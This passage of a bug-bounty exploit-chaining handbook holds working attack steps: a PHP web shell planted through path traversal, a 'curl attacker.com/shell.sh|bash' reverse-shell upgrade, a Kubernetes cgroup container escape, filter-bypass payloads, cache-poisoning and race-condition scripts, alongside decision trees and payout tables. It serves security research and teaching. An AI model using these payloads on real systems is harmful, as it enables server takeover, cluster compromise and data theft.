&#x20; # If the same traversal character works in the write endpoint:

&#x20; POST /api/files/save

&#x20; {"path": "../../var/www/html/uploads/shell.php",

&#x20;  "content": "<?php passthru($\_GET\['c']); ?>"}

&#x20; 

&#x20; # Verify:

&#x20; GET /uploads/shell.php?c=id

&#x20; # Response: uid=33(www-data)...

&#x20; # CONFIRMED: Path Traversal + Write → Web Shell RCE



STEP 5: Upgrade to reverse shell

&#x20; GET /uploads/shell.php?c=python3+-c+'import+socket,subprocess,os;...'

&#x20; # Or use curl to fetch and execute a shell script

&#x20; GET /uploads/shell.php?c=curl+http://attacker.com/shell.sh|bash

```



\*\*\*



\### Chain #8: Kubernetes Misconfiguration → Container Escape → Node Compromise



\*\*Severity Elevation:\*\* Medium K8s misconfig → Critical (Full cluster/node compromise)



```

STEP 1: Identify dangerous pod configurations

&#x20; grep -rn "privileged: true" --include="\*.yaml"

&#x20; grep -rn "hostPath:" --include="\*.yaml" -A2 | grep "path: /"

&#x20; grep -rn "automountServiceAccountToken: true" --include="\*.yaml"



STEP 2: Check serviceAccount RBAC permissions

&#x20; # If app has mounted service account token:

&#x20; cat /var/run/secrets/kubernetes.io/serviceaccount/token  # Inside pod

&#x20; 

&#x20; # Decode and check permissions:

&#x20; kubectl auth can-i --list --as=system:serviceaccount:default:app-sa

&#x20; # If shows: secrets get/list → can read all secrets in namespace

&#x20; # If shows: pods/exec → can exec into other pods

&#x20; # If shows: \* \* → full cluster admin



STEP 3: Container escape via privileged + hostPath

&#x20; # If privileged: true + hostPath /var/run/docker.sock:

&#x20; docker -H unix:///host/var/run/docker.sock run -v /:/host --rm -it alpine chroot /host

&#x20; # You are now root on the underlying NODE

&#x20; 

&#x20; # If privileged: true (no docker socket needed):

&#x20; # Mount host filesystem via cgroup:

&#x20; mkdir /tmp/cgroup \&\& mount -t cgroup -o memory none /tmp/cgroup

&#x20; mkdir /tmp/cgroup/x

&#x20; echo 1 > /tmp/cgroup/x/notify\_on\_release

&#x20; host\_path=$(sed -n 's/.\*\\perdir=\\(\[^,]\*\\).\*/\\1/p' /etc/mtab | head -1)

&#x20; echo "$host\_path/cmd" > /tmp/cgroup/release\_agent

&#x20; echo '#!/bin/sh' > /cmd \&\& echo 'id > /output' >> /cmd \&\& chmod +x /cmd

&#x20; # Triggers host root command execution → RCE on node



STEP 4: Pivot to other pods / secrets

&#x20; # With cluster-admin service account:

&#x20; kubectl get secrets --all-namespaces   # Read all secrets

&#x20; kubectl exec -it <critical-pod> -- /bin/sh  # Exec into DB pod

&#x20; kubectl get nodes -o wide  # Map the entire cluster

&#x20; # Impact: Complete Kubernetes cluster compromise

```



\*\*\*



\## 🧪 Exploitability Verification Master Framework



The most important skill is distinguishing a \*\*theoretical code smell\*\* from an \*\*actually exploitable vulnerability\*\*.  Reporting unverified findings wastes everyone's time and harms your reputation. \[oligo](https://www.oligo.security/academy/application-security-testing-in-2025-techniques-best-practices)



\### The Exploitability Decision Tree



```

&#x20;                   ┌─────────────────────────────────┐

&#x20;                   │    CANDIDATE VULNERABILITY        │

&#x20;                   │    (found via code review)        │

&#x20;                   └──────────────┬──────────────────┘

&#x20;                                  │

&#x20;                   ┌──────────────▼──────────────┐

&#x20;                   │  Q1: Is the sink reachable   │

&#x20;                   │  from a network endpoint?    │

&#x20;                   └──────┬───────────┬───────────┘

&#x20;                          │YES        │NO

&#x20;                   ┌──────▼───┐  ┌────▼───────────────────┐

&#x20;                   │Continue  │  │Mark: "Local Access Only" │

&#x20;                   └──────────┘  │Severity: -1 tier        │

&#x20;                                 └─────────────────────────┘

&#x20;                   ┌─────────────────────────────────┐

&#x20;                   │  Q2: Is user input the          │

&#x20;                   │  data reaching the sink?        │

&#x20;                   │  (vs. hardcoded/config value)   │

&#x20;                   └──────┬───────────┬──────────────┘

&#x20;                          │YES        │NO

&#x20;                   ┌──────▼───┐  ┌────▼──────────────────────┐

&#x20;                   │Continue  │  │Mark: "Not User-Controlled" │

&#x20;                   └──────────┘  │Not a vulnerability          │

&#x20;                                 └───────────────────────────-┘

&#x20;                   ┌─────────────────────────────────┐

&#x20;                   │  Q3: Is there a sanitizer       │

&#x20;                   │  between source and sink?       │

&#x20;                   └──────┬───────────┬──────────────┘

&#x20;                          │NO         │YES

&#x20;                   ┌──────▼──────┐  ┌─▼────────────────────────┐

&#x20;                   │HIGH         │  │  Q3a: Can it be bypassed? │

&#x20;                   │CONFIDENCE   │  └──────┬──────────┬─────────┘

&#x20;                   └──────┬──────┘        │YES       │NO

&#x20;                          │         ┌─────▼───┐  ┌───▼────────────────┐

&#x20;                          │         │Document │  │Mark: "Mitigated"   │

&#x20;                          │         │bypass   │  │May still be worth  │

&#x20;                          │         └─────┬───┘  │reporting as Gap    │

&#x20;                          │               │      └────────────────────┘

&#x20;                   ┌──────▼───────────────▼──┐

&#x20;                   │  Q4: Can you construct  │

&#x20;                   │  a working payload?     │

&#x20;                   └──────┬───────────┬──────┘

&#x20;                          │YES        │NO

&#x20;                   ┌──────▼───────┐  ┌▼─────────────────────────────────┐

&#x20;                   │CONFIRMED     │  │Mark: "Code Review Only / Unverified"│

&#x20;                   │VULNERABILITY │  │Report with lower confidence        │

&#x20;                   │Build PoC →   │  │Include reproduction blockers       │

&#x20;                   │Report        │  └──────────────────────────────────--┘

&#x20;                   └──────────────┘

```



\### Sanitizer Bypass Reference



When a sanitizer exists between source and sink, use these bypass patterns to check if it's properly implemented: \[vickieli](https://vickieli.dev/hacking/code-review-101/)



```

BYPASS TYPE 1: Encoding tricks

&#x20; Target sanitizer: filters "script" keyword

&#x20; Bypass: <ScRiPt>, <scr<script>ipt>, <script/>, %3cscript%3e

&#x20; 

&#x20; Target sanitizer: filters "../" for path traversal

&#x20; Bypass: ..%2F, ..%252F (double-encode), ..\\/  (backslash), ....//



BYPASS TYPE 2: Type confusion

&#x20; Target sanitizer: checks if URL is a string starting with "https://"

&#x20; Bypass: Pass array instead: \["https://169.254.169.254"]

&#x20;         String coercion may preserve http:// check but lose array handling

&#x20; 

&#x20; Target sanitizer: parseInt() on user ID

&#x20; Bypass: "1 OR 1=1" → parseInt gives 1 (safe), but raw SQL uses full string



BYPASS TYPE 3: Unicode/homoglyph

&#x20; Target sanitizer: blocks "javascript:" in href

&#x20; Bypass: "javascriрt:" (Cyrillic р), "\\u006aavascript:", "java\&#x09;script:"



BYPASS TYPE 4: Null byte / truncation

&#x20; Target sanitizer: filename must end in .jpg

&#x20; Bypass: "shell.php\\x00.jpg" (null byte truncation in C-based functions)

&#x20; Bypass: "shell.php%00.jpg" (URL encoded null byte)



BYPASS TYPE 5: Second-order execution

&#x20; Target sanitizer: input is sanitized on write, but decoded on read

&#x20; Example: HTML entities stored → later eval()'d → executes as code

&#x20; 

BYPASS TYPE 6: Logic boundary conditions

&#x20; Target sanitizer: allows redirects only to same domain

&#x20; Bypass: "https://trusted.com.evil.com" (subdomain confusion)

&#x20; Bypass: "https://trusted.com@evil.com" (@ notation)

&#x20; Bypass: "https://trusted.com/../../evil.com" (path traversal in URL)

```



\*\*\*



\## 🔁 Inter-System Interaction Patterns



These are the most commonly missed vulnerabilities because they require understanding how two separate systems interact: \[owasp](https://owasp.org/www-community/Threat\_Modeling\_Process)



\### Pattern 1: The Cache Poisoning / Web Cache Deception Vector



```

SYSTEM INTERACTION: CDN/Cache ↔ Origin Server



HOW IT WORKS:

&#x20; CDN caches based on URL path

&#x20; Origin server caches based on different headers (e.g., Vary: Cookie)

&#x20; Attacker exploits the gap between the two caching rules



CODE-LEVEL SIGNALS:

&#x20; grep -rn "Cache-Control\\|X-Cache\\|Surrogate-Control\\|CDN-Cache" --include="\*.js"

&#x20; grep -rn "Vary:\\|no-store\\|public\\|private" --include="\*.js"



WEB CACHE DECEPTION ATTACK PROCEDURE: \[web:77]

&#x20; 1. Find an authenticated endpoint returning sensitive data:

&#x20;    GET /api/account/profile → returns email, PII

&#x20; 

&#x20; 2. Append a fake static path that the CDN will cache:

&#x20;    GET /api/account/profile/nonexistent.css

&#x20;    → Origin server: ignores the suffix, returns profile data (200)

&#x20;    → CDN: sees .css extension → caches the response publicly

&#x20; 

&#x20; 3. Victim visits the crafted URL while authenticated

&#x20;    → CDN caches their profile data (keyed by URL, not session)

&#x20; 

&#x20; 4. Attacker requests same URL unauthenticated

&#x20;    GET /api/account/profile/nonexistent.css

&#x20;    → CDN serves cached victim response → PII leaked



&#x20; VERIFICATION:

&#x20;   Request the URL twice. Second request should have X-Cache: HIT header.

&#x20;   If response contains victim's data and X-Cache: HIT → confirmed.



WEB CACHE POISONING (different attack):

&#x20; 1. Find a header that affects the response but is NOT in the cache key:

&#x20;    X-Forwarded-Host: evil.com

&#x20;    X-Forwarded-Scheme: https

&#x20; 

&#x20; 2. Send poisoned request:

&#x20;    GET / HTTP/1.1

&#x20;    Host: target.com

&#x20;    X-Forwarded-Host: evil.com

&#x20;    → If response contains "https://evil.com/..." → reflected in body

&#x20;    → If CDN caches this response → all users served poisoned content

&#x20; 

&#x20; DETECTION IN CODE:

&#x20;   grep -rn "req\\.headers\\\['x-forwarded-host'\\]\\|req\\.headers\\.host" --include="\*.js"

&#x20;   grep -rn "X-Forwarded-Host\\|HTTP\_HOST" --include="\*.php" --include="\*.py"

&#x20;   # If used in canonical URLs, redirects, or static asset paths → poisoning candidate

```



\### Pattern 2: Race Conditions in Concurrent Systems



```

SYSTEM INTERACTION: Application Logic ↔ Database ↔ Queue



THE TOCTOU PROBLEM (Time Of Check vs Time Of Use):

&#x20; The application CHECKS a condition at time T1

&#x20; The application USES the result at time T2

&#x20; Between T1 and T2, another request can CHANGE the condition



CODE-LEVEL SIGNALS:

&#x20; grep -rn "SELECT.\*WHERE.\*UPDATE\\|find.\*then.\*save\\|get.\*then.\*decrement" --include="\*.js"

&#x20; # Pattern: read then write WITHOUT database transaction or row lock



COMMON RACE CONDITION SCENARIOS: \[web:77]

&#x20; 1. BALANCE CHECKS (financial):

&#x20;    if (user.balance >= amount) {

&#x20;      user.balance -= amount;  // Two concurrent requests both pass check

&#x20;      user.save();             // Both subtract → negative balance

&#x20;    }

&#x20; 

&#x20; 2. RATE LIMITING:

&#x20;    count = redis.get('requests:' + ip)

&#x20;    if (count < 100) {

&#x20;      redis.incr('requests:' + ip)  // Race: both check before incr

&#x20;      processRequest()

&#x20;    }

&#x20; 

&#x20; 3. UNIQUE CONSTRAINT BYPASS:

&#x20;    existing = db.find({email: req.body.email})

&#x20;    if (!existing) {

&#x20;      db.create({email: req.body.email})  // Duplicate created if raced

&#x20;    }



EXPLOITATION PROCEDURE:

&#x20; # Use Burp Suite's "Send Group (Parallel)" or:

&#x20; python3 -c "

&#x20; import threading, requests

&#x20; 

&#x20; def attempt():

&#x20;     requests.post('https://target.com/api/redeem-coupon',

&#x20;         json={'code': 'ONCE\_PER\_USER'},

&#x20;         headers={'Authorization': 'Bearer TOKEN'})

&#x20; 

&#x20; threads = \[threading.Thread(target=attempt) for \_ in range(20)]

&#x20; \[t.start() for t in threads]

&#x20; \[t.join() for t in threads]

&#x20; "

&#x20; # Check if coupon was applied more than once



VERIFICATION SIGNALS:

&#x20; → Balance went negative

&#x20; → Coupon used more than allowed\_uses

&#x20; → Rate limit not enforced under parallel load

&#x20; → Duplicate unique records created

```



\### Pattern 3: GraphQL Cross-Object Authorization Leakage



```

SYSTEM INTERACTION: GraphQL Resolver ↔ Database ↔ Auth Layer



THE PROBLEM:

&#x20; GraphQL resolvers for NESTED objects often lack separate auth checks.

&#x20; Top-level query is authorized. Nested resolver is NOT.

&#x20; 

&#x20; Example:

&#x20; query {

&#x20;   user(id: ME) {           ← Auth check: must be logged in ✓

&#x20;     friends {              ← Auth check: must be friends ✓  

&#x20;       privateMessages {    ← Auth check: MISSING ✗

&#x20;         content            ← Returns ALL messages of friend

&#x20;       }

&#x20;     }

&#x20;   }

&#x20; }



CODE-LEVEL DETECTION:

&#x20; grep -rn "resolve\\s\*:" --include="\*.js" -A10 | grep -v "context\\.\\|isAuthenticated\\|authorize"

&#x20; # Find resolvers that access data without checking context.user



INTROSPECTION RECON PROCEDURE:

&#x20; # 1. Get full schema

&#x20; curl -X POST https://target.com/graphql \\

&#x20;   -H "Content-Type: application/json" \\

&#x20;   -d '{"query":"{\_\_schema{types{name fields{name type{name ofType{name}}}}}}"}'

&#x20; 

&#x20; # 2. Map all types and their fields

&#x20; # 3. Find sensitive fields: password, token, creditCard, ssn, privateKey

&#x20; # 4. Find a traversal path TO those fields through authorized objects

&#x20; # 5. Test traversal query for auth bypass



BATCH QUERY AMPLIFICATION:

&#x20; # GraphQL allows multiple queries in one request

&#x20; # If rate limiting is per-request (not per-query):

&#x20; POST /graphql

&#x20; \[

&#x20;   {"query": "{ user(id: 1) { email } }"},

&#x20;   {"query": "{ user(id: 2) { email } }"},

&#x20;   ... (repeat 1000x)

&#x20; ]

&#x20; # 1000 DB queries in 1 HTTP request → rate limit bypass, DoS, or mass data exfil

```



\### Pattern 4: OAuth/SAML Trust Boundary Abuse



```

SYSTEM INTERACTION: Identity Provider ↔ Service Provider ↔ Application



OAUTH COMMON MISCONFIGURATIONS:

&#x20; # 1. PKCE missing → authorization code interception

&#x20; grep -rn "code\_challenge\\|PKCE\\|code\_verifier" --include="\*.js"

&#x20; # If absent in mobile/SPA app → code can be stolen via redirect



&#x20; # 2. State parameter not validated → CSRF on OAuth flow

&#x20; grep -rn "state\\s\*=\\s\*req\\.\\|state.\*random\\|state.\*nonce" --include="\*.js"

&#x20; # If state not validated → force victim to link attacker's identity



&#x20; # 3. Token scope not checked server-side

&#x20; # App issues read+write token but only validates "Bearer token exists"

&#x20; # Client-enforced scopes can be bypassed by calling API directly



SAML VULNERABILITIES:

&#x20; # Signature wrapping attack

&#x20; grep -rn "saml\\|SAML\\|XMLVerifier\\|validateSAML" --include="\*.java" --include="\*.py"

&#x20; 

&#x20; # Check: does the app validate the signature on the FULL assertion?

&#x20; # Or only on a PART of the assertion?

&#x20; # Attack: wrap a valid signed node inside a malicious assertion

&#x20; # The signature check passes (signed node is valid)

&#x20; # But the app uses the OUTER malicious assertion for auth

&#x20; 

&#x20; # Test: Decode SAML response → inject malicious NameID → re-encode

&#x20; # Tools: SAMLRaider (Burp plugin), python3-saml exploitation scripts

```



\*\*\*



\## 📊 The Severity Amplification Matrix



Use this to determine how chaining changes individual bug severity: \[intigriti](https://www.intigriti.com/blog/business-insights/chaining-in-action-techniques-terminology-and-real-world-impact-on-business)



```

&#x20;                   ╔═══════════════════════════════════════════════╗

&#x20;                   ║         CHAIN SEVERITY AMPLIFICATION         ║

&#x20;                   ╠═══════════╦═══════════╦════════════╦══════════╣

&#x20;                   ║ Bug 1 \\   ║  LOW      ║  MEDIUM    ║  HIGH    ║

&#x20;                   ║  \\ Bug 2  ║           ║            ║          ║

&#x20;                   ╠═══════════╬═══════════╬════════════╬══════════╣

&#x20;                   ║ LOW       ║ MEDIUM    ║ HIGH       ║ CRITICAL ║

&#x20;                   ╠═══════════╬═══════════╬════════════╬══════════╣

&#x20;                   ║ MEDIUM    ║ HIGH      ║ HIGH/CRIT  ║ CRITICAL ║

&#x20;                   ╠═══════════╬═══════════╬════════════╬══════════╣

&#x20;                   ║ HIGH      ║ CRITICAL  ║ CRITICAL   ║ CRITICAL ║

&#x20;                   ╚═══════════╩═══════════╩════════════╩══════════╝



REAL EXAMPLES:

&#x20; Open Redirect (Low) + OAuth Token in URL Fragment (Low) = ATO (Critical)

&#x20; IDOR Read (Low) + Stored XSS (Medium)                  = Mass ATO (Critical)

&#x20; Path Traversal (Medium) + File Write (Medium)           = RCE (Critical)

&#x20; Prototype Pollution (Medium) + Template Engine (Medium) = RCE (Critical)

&#x20; SSRF (Medium) + Open Cloud IMDS (Medium)               = Full Cloud Pwn (Critical)

&#x20; Info Disclosure (Low) + Weak Password Policy (Low)     = Account Takeover (High)

```



\*\*\*



\## 🧭 The Systems Thinker's Field Guide



When reviewing any codebase, run through this mental checklist before grep-ing anything. This is how you think like an attacker at the system level: \[arxiv](https://arxiv.org/abs/2001.05734)



\### The 10 Questions That Find 90% of High-Severity Bugs



```

Q1: "WHERE DOES THIS SYSTEM MAKE OUTBOUND REQUESTS?"

&#x20;   → Every outbound HTTP client is an SSRF candidate.

&#x20;   → Every URL/IP from user input reaching that client is Critical.

&#x20;   → Map: What internal services exist at those IPs?



Q2: "WHAT DOES THIS SYSTEM DESERIALIZE OR PARSE?"

&#x20;   → Every parser is an attack surface: XML, YAML, pickle, JSON, 

&#x20;     archives, PDFs, images (ImageMagick), Office docs, protobufs.

&#x20;   → Who controls the input to the parser?

&#x20;   → Can the format include executable logic? (YAML!! yes. JSON no.)



Q3: "HOW DOES THIS SYSTEM KNOW WHO YOU ARE?"

&#x20;   → JWT? Examine the validation code.

&#x20;   → Session cookie? Check regeneration and HttpOnly/Secure.

&#x20;   → API key? Check rotation and scope limitation.

&#x20;   → IP address? Almost always bypassable.

&#x20;   → Any of these can be forged if implemented incorrectly.



Q4: "HOW DOES THIS SYSTEM KNOW WHAT YOU'RE ALLOWED TO DO?"

&#x20;   → RBAC? ABAC? Where is it enforced?

&#x20;   → Is it enforced at the route level? Per-query level? Both?

&#x20;   → Can you access a resource by ID without the system verifying you OWN it?



Q5: "WHERE DOES USER DATA BECOME CODE?"

&#x20;   → eval(), exec(), system(), popen(), template render with user data

&#x20;   → SQL query construction, shell command construction, LDAP query

&#x20;   → These are the highest-value sinks. Trace everything that reaches them.



Q6: "WHAT HAPPENS AT THE BOUNDARY BETWEEN SERVICES?"

&#x20;   → Service A trusts Service B because they're both internal → what if B is compromised?

&#x20;   → Message queues: who can write to the queue? Who reads and executes?

&#x20;   → Webhooks: does the receiver verify the sender's identity?



Q7: "WHAT IS CACHED, AND WHAT IS THE CACHE KEY?"

&#x20;   → CDN: key = URL. If response contains user-specific data + URL is guessable → cache deception.

&#x20;   → Redis: if key = user\_id and key is user-controlled → cache poisoning.

&#x20;   → Server-side: if expensive function is cached without tenant isolation → cross-tenant data leak.



Q8: "WHERE DOES THIS SYSTEM WRITE FILES?"

&#x20;   → Any file write with user-controlled path or content = RCE candidate.

&#x20;   → Log files written to webroot? → log injection → code execution.

&#x20;   → Config files written by user input? → config injection.



Q9: "WHERE ARE THE RACE CONDITIONS?"

&#x20;   → Any "check then act" pattern without DB transactions or locks.

&#x20;   → Payment processing, rate limiting, coupon redemption, inventory.

&#x20;   → Look for: SELECT then UPDATE in separate queries without FOR UPDATE.



Q10: "WHAT IS TRUSTED IMPLICITLY THAT SHOULDN'T BE?"

&#x20;    → X-Forwarded-For trusted for IP allowlisting (trivially spoofed).

&#x20;    → Referer header trusted for CSRF protection (strippable).

&#x20;    → User-agent trusted to identify mobile clients (trivially changed).

&#x20;    → Host header trusted in password reset links (Host header injection).

&#x20;    → Internal network position trusted without auth (SSRF pivot target).

```



\*\*\*



\## 🗂️ Master Exploit Chain Lookup Table



| Chain | Starting Bug | Bridge | Final Impact | Typical Payout |

|---|---|---|---|---|

| Stored XSS → Admin ATO | Stored XSS (Medium) | Renders in admin dashboard | Full app compromise | $5k–$30k |

| SSRF → Cloud RCE | SSRF (Medium) | IMDS v1 enabled, IAM wildcard | Full cloud infra | $10k–$50k |

| Prototype Pollution → RCE | PP (Medium) | Pug/Handlebars template gadget | Server RCE | $10k–$50k |

| IDOR + XSS → Mass ATO | IDOR write (Low) + XSS (Medium) | Shared rendering context | Mass user ATO | $5k–$20k |

| Open Redirect → OAuth | Open Redirect (Low) | OAuth redirect\_uri match | Account takeover | $3k–$15k |

| Path Traversal → Web Shell | LFI (Medium) + File Write (Medium) | Webroot accessible | Server RCE | $5k–$25k |

| JWT alg:none → Admin | Weak JWT (Critical) | Direct | Full app access | $5k–$20k |

| Race Condition → Infinite Balance | TOCTOU (Medium) | No DB transaction | Financial fraud | $2k–$10k |

| K8s Privesc → Cluster Takeover | Privileged pod (High) | Host mount | Full cluster | $10k–$50k |

| Deserialization → RCE | Pickle/YAML (Critical) | User-controlled input | Server RCE | $10k–$50k |

| GraphQL IDOR → Data Dump | Auth bypass on resolver | Nested object traversal | Mass PII exfil | $5k–$20k |

| Supply Chain → Backdoor | Dep confusion (High) | CI/CD pipeline trust | All production apps | $5k–$50k  \[nahamsec](https://www.nahamsec.com/posts/high-value-web-security-vulnerabilities-to-learn-in-2025) |

| Web Cache Deception → PII | CDN misconfiguration | Static file extension bypass | User data leak | $2k–$10k  \[nahamsec](https://www.nahamsec.com/posts/high-value-web-security-vulnerabilities-to-learn-in-2025) |



\*\*\*



\## 🎓 The Mental Model: Thinking Holistically About an Application



The final and most important framework: a repeatable mental script for every engagement. \[intigriti](https://www.intigriti.com/blog/business-insights/chaining-in-action-techniques-terminology-and-real-world-impact-on-business)



```

THE HOLISTIC SECURITY THINKER'S SCRIPT



When you first see a codebase, say to yourself:



"This system was built by humans with assumptions.

&#x20;My job is to find where those assumptions break.

&#x20;I am not looking for bugs in isolation.

&#x20;I am looking for PATHS from low-trust input to high-trust output."



STEP 1: ORIENT

&#x20; "What is this system? What would a real attacker WANT from it?"

&#x20; → User credentials? Financial data? Admin access? Code execution?



STEP 2: MAP TRUST BOUNDARIES

&#x20; "Where does trust INCREASE in this system?"

&#x20; → The moment trust increases is the moment to ask: 'Can I fake my way past this?'



STEP 3: FIND THE PRIMITIVES

&#x20; "What low-level capabilities can I acquire?"

&#x20; → Read file? Make HTTP request? Write content? Inject data into query?

&#x20; → List every primitive available to an attacker at each trust level.



STEP 4: CHAIN TOWARD IMPACT

&#x20; "Starting from these primitives, what paths lead to my target?"

&#x20; → Can READ → find credential → use credential → escalate trust

&#x20; → Can MAKE REQUEST → reach internal service → that service has weaker auth

&#x20; → Can WRITE CONTENT → content rendered in admin context → admin ATO



STEP 5: VERIFY EACH LINK

&#x20; "Can each step in the chain actually be performed?"

&#x20; → Don't assume. Build the minimal PoC for each link.

&#x20; → A chain is only as strong as its weakest verified link.



STEP 6: CALCULATE TRUE IMPACT

&#x20; "Starting from the user's initial trust level, where do I end up?"

&#x20; → Unauthenticated → Admin? = Critical

&#x20; → Low-privilege user → Full cloud access? = Critical

&#x20; → One tenant → another tenant's data? = High

&#x20; → Self only → no real impact = Informational



STEP 7: DOCUMENT THE NARRATIVE

&#x20; "Can I tell this story in 3 sentences?"

&#x20; → "An unauthenticated attacker can send a specially crafted JSON body

&#x20;    that pollutes the Node.js Object prototype, which causes the Pug

&#x20;    template engine to execute arbitrary OS commands, resulting in

&#x20;    full server-level remote code execution."

&#x20; If you can't say it in 3 sentences, you don't understand it well enough yet.

```



This handbook synthesizes exploit chaining methodology from confirmed Intigriti and HackerOne research, high-value vulnerability patterns from leading bug bounty hunters, systems thinking frameworks applied to cybersecurity, and threat modeling processes from OWASP. The chain playbooks are grounded in real payout reports — the SSRF→cloud chain, prototype pollution→RCE via Kibana, and IDOR+XSS→mass ATO are among the most frequently rewarded chains in modern programs. \[penligent](https://www.penligent.ai/hackinglabs/apple-bug-bounty-how-to-qualify-for-the-highest-rewards-in-2025-and-beyond/)

